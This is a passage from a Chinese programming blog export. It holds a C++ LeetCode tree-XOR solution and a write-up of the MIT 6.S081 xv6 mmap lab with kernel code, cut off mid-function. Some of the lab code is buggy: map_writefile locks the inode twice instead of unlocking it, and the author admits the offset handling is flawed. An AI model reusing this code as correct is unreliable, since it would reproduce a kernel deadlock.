<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>题目非常有意思的说，我们枚举所有可能的两条边即可：</li>
</ol>
<ul>
<li>我们首先求出所有节点的异或的值为 $tot$;</li>
<li>设 $dp[x][y]$ 表示去掉节点 $x$ 且以节点 $y$ 为根节点的子树所有节点异或的值;</li>
<li>我们依次枚举去掉 $x$ 且以节点为 $y$ 为根节点的子树中依次去掉一条变 $[a,b]$，此时整个树被分为三部分：<ul>
<li>以 $y$ 为根节点的子树的节点所有值的异或 $dp[x][y]$;</li>
<li>以 $b$ 为根节点的子树的节点所有值的异或 $dp[a][b]$;</li>
<li>剩余的部分的节点的值异或为 $tot \oplus dp[x][y] \oplus dp[a][b]$;</li>
<li>此时我们即可获分数为：$\max (dp[x][y],dp[a][b], tot \oplus dp[x][y] \oplus dp[a][b]) - \min (dp[x][y],dp[a][b], tot \oplus dp[x][y] \oplus dp[a][b])$。</li>
</ul>
</li>
</ul>
<ol start="2">
<li>枚举所有的可能即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$n^2$， $n$ 表示节点的数目。</li>
<li>空间复杂度：$n^2$, $n$ 表示节点的数目。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> parent, <span class="type">int</span> root, vector&lt;<span class="type">int</span>&gt; &amp;nums, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;adj)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> res = nums[root];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;neg : adj[root]) &#123;</span><br><span class="line">            <span class="keyword">if</span> (neg == parent) <span class="keyword">continue</span>;</span><br><span class="line">            res ^= <span class="built_in">dfs</span>(root, neg, nums, adj);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minimumScore</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; edges)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> m = edges.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> tot = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> res = INT_MAX;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n));</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">adj</span>(n);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            tot ^= nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;e : edges) &#123;</span><br><span class="line">            adj[e[<span class="number">0</span>]].<span class="built_in">emplace_back</span>(e[<span class="number">1</span>]);</span><br><span class="line">            adj[e[<span class="number">1</span>]].<span class="built_in">emplace_back</span>(e[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;e : edges) &#123;</span><br><span class="line">            dp[e[<span class="number">0</span>]][e[<span class="number">1</span>]] = <span class="built_in">dfs</span>(e[<span class="number">0</span>], e[<span class="number">1</span>], nums, adj);</span><br><span class="line">            dp[e[<span class="number">1</span>]][e[<span class="number">0</span>]] = tot ^ dp[e[<span class="number">0</span>]][e[<span class="number">1</span>]];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">visit</span><span class="params">(n, <span class="literal">false</span>)</span></span>;</span><br><span class="line">            visit[i] = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;neg: adj[i]) &#123;</span><br><span class="line">                queue&lt;<span class="type">int</span>&gt; qu;</span><br><span class="line">                qu.<span class="built_in">emplace</span>(neg);</span><br><span class="line">                visit[neg] = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">while</span>(!qu.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">                    <span class="type">int</span> curr = qu.<span class="built_in">front</span>();</span><br><span class="line">                    qu.<span class="built_in">pop</span>();</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">auto</span> &amp; next: adj[curr]) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (visit[next]) <span class="keyword">continue</span>;                        </span><br><span class="line">                        res = <span class="built_in">min</span>(res, <span class="built_in">max</span>(&#123;dp[neg][i], dp[curr][next], tot^dp[neg][i]^dp[curr][next]&#125;) -</span><br><span class="line">                                       <span class="built_in">min</span>(&#123;dp[neg][i], dp[curr][next], tot^dp[neg][i]^dp[curr][next]&#125;));                       </span><br><span class="line">                        visit[next] = <span class="literal">true</span>;</span><br><span class="line">                        qu.<span class="built_in">emplace</span>(next);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;        </span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>【MIT6.S081】lab10 mmap</title>
    <url>/2022/11/20/%E5%85%AC%E5%BC%80%E8%AF%BE%E5%AD%A6%E4%B9%A0/83/</url>
    <content><![CDATA[<h2 id="MIT-6-S081-lab10"><a href="#MIT-6-S081-lab10" class="headerlink" title="MIT 6.S081 lab10"></a>MIT 6.S081 lab10</h2><p>感觉这个 <code>lab</code> 还是挺有意思的，但是感觉没有前面几个 <code>lab</code> 难，感觉前面几个 <code>lab</code> 的难度太大了，这个 <code>lab</code> 花了<code>2</code> 天左右就完成了，当前中间还是有些点比较有疑问的问题，后续还需要进一步来思考的空间。在这个 <code>lab</code> 中的学习内容比较多，主要学习了以下几个知识重点:</p>
<ul>
<li><code>mmap</code> 的实现原理：如果仅仅实现 <code>mmap</code> 的话，原理比较简单。每次发起系统调用 <code>mmap</code> 时，就会在该进程的内核空间中申请一块内存并与之对应 <code>WMA AREA</code> 相对应，并更新当前进程的页表，如果我们使用 <code>lazy alloc</code>，此时并不会马上更新物理内存的内容，也并未申请实际的物理页与之相对应。</li>
<li>当进程读取到该 <code>VMA</code> 对应的内存区域时，会发生缺页中断，当进程捕获到该中断时会检测缺页的地址是否属于某个 <code>VMA</code>，如果该地址合法则申请新的物理页并将其进行 <code>mapping</code> 到 <code>VMA</code> 给定的地址空间中。同时将给定的 <code>fd</code> 中对应的内容读取到该物理页中，此时对于用户空间的应用则可以读取到相应的 <code>fd</code> 对应的内容，我们可以将同一个 <code>fd</code> 中对应的内容 <code>map</code> 到多个进程中。实际上每个 <code>fd</code> 可能对应的是某个文件或者设备，我们如果将其映射到内存的地址空间中就可以很方便和快速的进行读写与共享。 </li>
<li>当我们试图对 <code>VMA</code> 对应的内存进行修改时，修改的内容暂时保存在物理内存中，比如可能多个应用程序对某个文件进行多次写操作，但这些执行都保存在内存中并未实际写入到文件中，当我们执行 <code>unmap</code> 操作时，操作系统才可能将这些修改内容一次性的全部写入到文件中，这是一种非常高效的共享机制。</li>
<li>使得用户空间的程序能够处理进程捕获的 <code>page fault</code>，这就需要每个用户进程在内核空间存在一个对应的内核线程来传递这些 <code>trap</code>。用户空间中能够处理这样 <code>trap</code>，并同时能够对物理页进行操纵。用户空间的 <code>handler</code> 处理完成后，再返回内核。</li>
</ul>
<p>重要的是本章节提到了 <code>Baker&#39;s Real-Time Copying Garbage Collector</code> 的运行工作原理:<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202211121533490.png"><br>当然其中的原理还是挺复杂，需要专门的一个章节来完成。</p>
<h4 id="lab10-mmap"><a href="#lab10-mmap" class="headerlink" title="lab10 mmap"></a>lab10 mmap</h4><p>本章的 <code>lab</code> 比较起来就不算是特别难的 <code>lab</code> 了。但是 <code>lab</code> 后面的 <code>Optional challenges</code> 难度就非常大了，可能需要花费非常多的时间来完成了。所有的源代码都放在<a href="https://github.com/mike-box/MIT6.S081">github</a>。</p>
<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The mmap and munmap system calls allow UNIX programs to exert detailed control over their address spaces. They can be used to share memory among processes, to map files into process address spaces, and as part of user-level page fault schemes such as the garbage-collection algorithms discussed in lecture. In this lab you&#x27;ll add mmap and munmap to xv6, focusing on memory-mapped files.</span><br><span class="line">Fetch the xv6 source for the lab and check out the mmap branch:</span><br><span class="line"></span><br><span class="line">  $ git fetch</span><br><span class="line">  $ git checkout mmap</span><br><span class="line">  $ make clean</span><br><span class="line">The manual page (run man 2 mmap) shows this declaration for mmap:</span><br><span class="line"></span><br><span class="line">void *mmap(void *addr, size_t length, int prot, int flags,</span><br><span class="line">           int fd, off_t offset);</span><br><span class="line">mmap can be called in many ways, but this lab requires only a subset of its features relevant to memory-mapping a file. You can assume that addr will always be zero, meaning that the kernel should decide the virtual address at which to map the file. mmap returns that address, or 0xffffffffffffffff if it fails. length is the number of bytes to map; it might not be the same as the file&#x27;s length. prot indicates whether the memory should be mapped readable, writeable, and/or executable; you can assume that prot is PROT_READ or PROT_WRITE or both. flags will be either MAP_SHARED, meaning that modifications to the mapped memory should be written back to the file, or MAP_PRIVATE, meaning that they should not. You don&#x27;t have to implement any other bits in flags. fd is the open file descriptor of the file to map. You can assume offset is zero (it&#x27;s the starting point in the file at which to map).</span><br><span class="line"></span><br><span class="line">It&#x27;s OK if processes that map the same MAP_SHARED file do not share physical pages.</span><br><span class="line"></span><br><span class="line">munmap(addr, length) should remove mmap mappings in the indicated address range. If the process has modified the memory and has it mapped MAP_SHARED, the modifications should first be written to the file. An munmap call might cover only a portion of an mmap-ed region, but you can assume that it will either unmap at the start, or at the end, or the whole region (but not punch a hole in the middle of a region).</span><br></pre></td></tr></table></figure>
<h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><ul>
<li><code>mmap</code> 的实现: 在这个 <code>lab</code> 中 <code>mmap</code> 的实现就非常简单了，我们首先观察一下该函数的模型<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">mmap</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> length, <span class="type">int</span> prot, <span class="type">int</span> flags,</span></span><br><span class="line"><span class="params">           <span class="type">int</span> fd, <span class="type">off_t</span> offset)</span>;</span><br></pre></td></tr></table></figure></li>
<li>它接受 <code>6</code> 个参数:<ul>
<li><code>addr</code> 指定的映射地址;</li>
<li><code>length</code> 指定的映射的内存长度;</li>
<li><code>prot</code> 指定的读写权限;</li>
<li><code>flags</code> 指定的该映射的模式，如果为 <code>MAP_SHARED</code> 表示映射的内存会回写到指定的<code>fd</code> 中, 还有其他的标志位；</li>
<li><code>fd</code> 指定的文件的描述符；</li>
<li><code>offset</code> 指定的文件的偏移量;</li>
</ul>
</li>
</ul>
<p>给定的 <code>lab</code> 只要求完成基本的功能即可，即不考虑文件的 <code>偏移量</code> 并且不指定映射的地址空间，实际我们实现时只需要在该进程的虚拟地址空间末尾增减 <code>length</code> 长度，然后将其新增加的尾部地址空间映射到指定 <code>fd</code> 上即可，实现非常简单了。里面有几个难点如下:</p>
<ul>
<li><p>首先我们直接将该进程的地址空间增减 <code>length</code> 长度，当然这里涉及到内存对齐的问题，这是由于进程每次只能向内核申请以物理页为最小单位的内存，所以这里需要处理涉及到内存对齐的问题，即映射的地址空间的起始位置要对齐 <code>PG_SIZE</code>。我们可以参考 <code>cow lab</code> 中的实现，直接将内存空间增大即可。</p>
</li>
<li><p>第二步我们需要在该进程中记录映射的区域，即所有的 <code>vma</code>，由于给定的 <code>lab</code> 中最大的 <code>vma</code> 只有 <code>16</code> 个，我们可以采用数组或者链表来实现，实现的 <code>linux</code> 实现就非常复杂了，实际处理应该是用的 <code>reb-black tree</code> 来记录所有的 <code>vma</code>，因为涉及到 <code>vma</code> 的查找，此时利用高效的二分搜索才能提高查找效率。</p>
</li>
<li><p>第三步，比较重要的是我们要完成真正的映射，前面提到过我们仅仅增加了进程的地址空间但并未分配实际的物理页，当存在某些程序读取到该未分配的地址空间时就会触发缺页中断，此时我们就需要在 <code>user trap</code> 中进行处理，此时我们就查找该进程的 <code>vma</code>，查找缺页的地址是否在 <code>vma</code> 记录中，</p>
<ul>
<li>如果在 <code>vma</code> 中，则我们从堆中申请一个新的物理页，并从 <code>vma</code> 中记录的 <code>fd</code> 中读取一个页长度的内容到新加入的物理页中。此时需要注意的是我们计算读取内从的 <code>offset</code>，稍微需要一点技巧。</li>
<li>如果该地址不在 <code>vma</code> 中，则将直接返回缺页中断。</li>
</ul>
</li>
<li><p>以上即完成了基本的 <code>map</code> 功能。</p>
</li>
<li><p><code>munmap</code> 的实现: 首先我们观察一下 <code>munmap</code> 的函数原型如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">munmap(addr, length)</span><br></pre></td></tr></table></figure></li>
<li><p>给定的参数只有两个指定的地址与长度，我们在进行 <code>umap</code> 操作时，首先会计算物理页的长度，由于题目给定的限定条件为 <code>umanp</code> 操作只会从起始地址到结束地址依次进行 <code>umap</code> 而不会存在从中间进行 <code>umap</code> 的操作，因此就比较容易实现。</p>
<ul>
<li>首先我们从 <code>vma</code> 中查找给定的 <code>addr</code> 是否合法，如果合法则将其从中去除，并查看该 <code>vma</code> 的对应的 <code>flag</code>，如果 <code>flag</code> 为 <code>MAP_SHARED</code> 则将其写回到文件中，当然这里实际应该需要处理一下文件的 <code>offset</code> 的问题，存在一定的瑕疵。</li>
<li>上述操作完成后，则将该段地址对应的物理页内存全部释放掉。当然我比较异疑惑的一点，对应的物理内存页释放掉，但是进程的地址空间实际没有进行变化，按道理此时进程的地址空间也应该释放掉一部分，否则每次访问该对应的地址都会出现 <code>page fault</code> 的问题。</li>
</ul>
</li>
<li><p>对于 <code>fork</code> 子进程时，子进程创建时需要复制父进程的 <code>vma</code> 表项，当进程退出进行 <code>exit</code> 时需要释放 <code>vma</code>，并将其所有的内容可以写回需要写回到文件中。</p>
</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><ol>
<li><p>增加 <code>sys_map</code> 与 <code>sys_umap</code> 的系统调用。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="title">uint64</span> <span class="params">(*syscalls[])</span><span class="params">(<span class="type">void</span>)</span> </span>= &#123;</span><br><span class="line">[SYS_fork]    sys_fork,</span><br><span class="line">[SYS_exit]    sys_exit,</span><br><span class="line">[SYS_wait]    sys_wait,</span><br><span class="line">[SYS_pipe]    sys_pipe,</span><br><span class="line">[SYS_read]    sys_read,</span><br><span class="line">[SYS_kill]    sys_kill,</span><br><span class="line">[SYS_exec]    sys_exec,</span><br><span class="line">[SYS_fstat]   sys_fstat,</span><br><span class="line">[SYS_chdir]   sys_chdir,</span><br><span class="line">[SYS_dup]     sys_dup,</span><br><span class="line">[SYS_getpid]  sys_getpid,</span><br><span class="line">[SYS_sbrk]    sys_sbrk,</span><br><span class="line">[SYS_sleep]   sys_sleep,</span><br><span class="line">[SYS_uptime]  sys_uptime,</span><br><span class="line">[SYS_open]    sys_open,</span><br><span class="line">[SYS_write]   sys_write,</span><br><span class="line">[SYS_mknod]   sys_mknod,</span><br><span class="line">[SYS_unlink]  sys_unlink,</span><br><span class="line">[SYS_link]    sys_link,</span><br><span class="line">[SYS_mkdir]   sys_mkdir,</span><br><span class="line">[SYS_close]   sys_close,</span><br><span class="line">[SYS_mmap]    sys_mmap,</span><br><span class="line">[SYS_munmap]   sys_munmap</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>vma</code> 结构的定义如下，并在 <code>proc</code> 结构体中增加 <code>vma</code> 表项，每次 <code>vma</code> 都对应记录地址映射的内容。</p>
</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* vam entry */</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">vmaEntry</span> &#123;</span><br><span class="line">	uint64 addr;</span><br><span class="line">	uint32 length;</span><br><span class="line">	uint32 permissions;</span><br><span class="line">	uint32 flag;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">file</span> *pf;</span><br><span class="line">	uint32 offset;</span><br><span class="line">	uint32 valid;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">vmaEntry</span> *next;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">vmaEntry</span> *prev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Per-process state</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">proc</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">spinlock</span> lock;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// p-&gt;lock must be held when using these:</span></span><br><span class="line">  <span class="keyword">enum</span> <span class="title class_">procstate</span> state;        <span class="comment">// Process state</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">proc</span> *parent;         <span class="comment">// Parent process</span></span><br><span class="line">  <span class="type">void</span> *chan;                  <span class="comment">// If non-zero, sleeping on chan</span></span><br><span class="line">  <span class="type">int</span> killed;                  <span class="comment">// If non-zero, have been killed</span></span><br><span class="line">  <span class="type">int</span> xstate;                  <span class="comment">// Exit status to be returned to parent&#x27;s wait</span></span><br><span class="line">  <span class="type">int</span> pid;                     <span class="comment">// Process ID</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// these are private to the process, so p-&gt;lock need not be held.</span></span><br><span class="line">  uint64 kstack;               <span class="comment">// Virtual address of kernel stack</span></span><br><span class="line">  uint64 sz;                   <span class="comment">// Size of process memory (bytes)</span></span><br><span class="line">  <span class="type">pagetable_t</span> pagetable;       <span class="comment">// User page table</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">trapframe</span> *trapframe; <span class="comment">// data page for trampoline.S</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">context</span> context;      <span class="comment">// swtch() here to run process</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">file</span> *ofile[NOFILE];  <span class="comment">// Open files</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">inode</span> *cwd;           <span class="comment">// Current directory</span></span><br><span class="line">  <span class="type">char</span> name[<span class="number">16</span>];               <span class="comment">// Process name (debugging)</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">vmaEntry</span> vma[<span class="number">16</span>];         <span class="comment">// Process vma entry</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ol start="3">
<li><p><code>sys_map</code> 与 <code>sys_umap</code> 的实现</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;riscv.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;defs.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;param.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;spinlock.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;proc.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;fs.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sleeplock.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;file.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;fcntl.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sysmap.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> max(a, b) ((a) &gt; (b) ? (a) : (b))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> min(a, b) ((a) &lt; (b) ? (a) : (b))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">map_readfile</span><span class="params">(<span class="type">int</span> vma_offset, <span class="type">int</span> offset, uint64 addr, <span class="type">int</span> length)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">proc</span> * p = <span class="built_in">myproc</span>();</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">file</span> *pf = p-&gt;vma[vma_offset].pf;</span><br><span class="line">	<span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">ilock</span>(pf-&gt;ip);</span><br><span class="line">	ret = <span class="built_in">readi</span>(pf-&gt;ip, <span class="number">0</span>, addr, offset, length);</span><br><span class="line">	<span class="built_in">iunlock</span>(pf-&gt;ip);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">map_writefile</span><span class="params">(<span class="keyword">struct</span> file *pf, <span class="type">int</span> offset, uint64 addr, <span class="type">int</span> length)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">begin_op</span>();</span><br><span class="line">	<span class="built_in">ilock</span>(pf-&gt;ip);</span><br><span class="line">	ret = <span class="built_in">writei</span>(pf-&gt;ip, <span class="number">1</span>, addr, offset, length);</span><br><span class="line">	<span class="built_in">ilock</span>(pf-&gt;ip);</span><br><span class="line">	<span class="built_in">end_op</span>();</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">map_vma_init</span><span class="params">(<span class="keyword">struct</span> vmaEntry *vma)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_ENTRY_SIZE; i++) &#123;</span><br><span class="line">	  vma[i].valid = <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">map_vma_copy</span><span class="params">(<span class="keyword">struct</span> vmaEntry *src, <span class="keyword">struct</span> vmaEntry *dst)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_ENTRY_SIZE; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (src[i].valid) &#123;</span><br><span class="line">		   dst[i].addr = src[i].addr;</span><br><span class="line">		   dst[i].length = src[i].length;</span><br><span class="line">		   dst[i].permissions = src[i].permissions;</span><br><span class="line">		   dst[i].flag = src[i].flag;</span><br><span class="line">		   dst[i].pf = src[i].pf;</span><br><span class="line">		   dst[i].offset = src[i].offset;</span><br><span class="line">		   dst[i].valid = <span class="number">1</span>;</span><br><span class="line">		   dst[i].pf = <span class="built_in">filedup</span>(dst[i].pf);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		   dst[i].valid = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	 &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">map_vma_query</span><span class="params">(uint64 va)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">struct</span> <span class="title class_">proc</span> *p = <span class="built_in">myproc</span>();</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_ENTRY_SIZE; i++) &#123;</span><br><span class="line">   	   <span class="keyword">if</span> (p-&gt;vma[i].valid) &#123;</span><br><span class="line">		   <span class="type">int</span> offset = va - p-&gt;vma[i].addr;</span><br><span class="line">		   <span class="keyword">if</span> (offset &gt;= <span class="number">0</span> &amp;&amp; offset &lt; p-&gt;vma[i].length) &#123;</span><br><span class="line">				<span class="keyword">return</span> i;</span><br><span class="line">		   &#125;</span><br><span class="line">   	   &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">map_vma_add</span><span class="params">(uint64 addr, <span class="keyword">struct</span> file *f, <span class="type">int</span> len, <span class="type">int</span> prot, <span class="type">int</span> flag, <span class="type">int</span> offset)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">proc</span> * p = <span class="built_in">myproc</span>();</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* record the vma of the current process */</span></span><br><span class="line">  f-&gt;ref++;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_ENTRY_SIZE; i++) &#123;</span><br><span class="line">  	<span class="keyword">if</span> (!p-&gt;vma[i].valid) &#123;</span><br><span class="line">		p-&gt;vma[i].valid = <span class="number">1</span>;</span><br><span class="line">		p-&gt;vma[i].addr = addr;</span><br><span class="line">		p-&gt;vma[i].length = len;</span><br><span class="line">		p-&gt;vma[i].permissions = prot;</span><br><span class="line">		p-&gt;vma[i].flag = flag;</span><br><span class="line">		p-&gt;vma[i].pf = f;</span><br><span class="line">		p-&gt;vma[i].offset = offset &amp; ~(PGSIZE - <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">map_vma_remove</span><span class="params">(<span class="type">int</span> vma_offset)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">proc</span> *p = <span class="built_in">myproc</span>();</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* remove all the pages from process */</span></span><br><span class="line">	<span class="keyword">if</span> ((p-&gt;vma[vma_offset].permissions &amp; PROT_WRITE) &amp;&amp; p-&gt;vma[vma_offset].flag == MAP_SHARED) &#123;</span><br><span class="line">		<span class="built_in">filewrite</span>(p-&gt;vma[vma_offset].pf, p-&gt;vma[vma_offset].addr, p-&gt;vma[vma_offset].length);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">uvmunmap</span>(p-&gt;pagetable, p-&gt;vma[vma_offset].addr, p-&gt;vma[vma_offset].length / PGSIZE, <span class="number">0</span>);</span><br><span class="line">	<span class="comment">/* remove all mapped pages */</span></span><br><span class="line">	p-&gt;vma[vma_offset].pf-&gt;ref--;</span><br><span class="line">	p-&gt;vma[vma_offset].valid = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">map_unmap</span><span class="params">(uint64 addr, <span class="type">int</span> length)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> vma_offset = <span class="built_in">map_vma_query</span>(addr);</span><br><span class="line">	<span class="keyword">if</span> (vma_offset == <span class="number">-1</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">proc</span> *p = <span class="built_in">myproc</span>();</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* remove all the pages from process */</span></span><br><span class="line">	<span class="keyword">if</span> (p-&gt;vma[vma_offset].flag == MAP_SHARED) &#123;</span><br><span class="line">		<span class="built_in">filewrite</span>(p-&gt;vma[vma_offset].pf, p-&gt;vma[vma_offset].addr, p-&gt;vma[vma_offset].length);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">uvmunmap</span>(p-&gt;pagetable, p-&gt;vma[vma_offset].addr, length / PGSIZE, <span 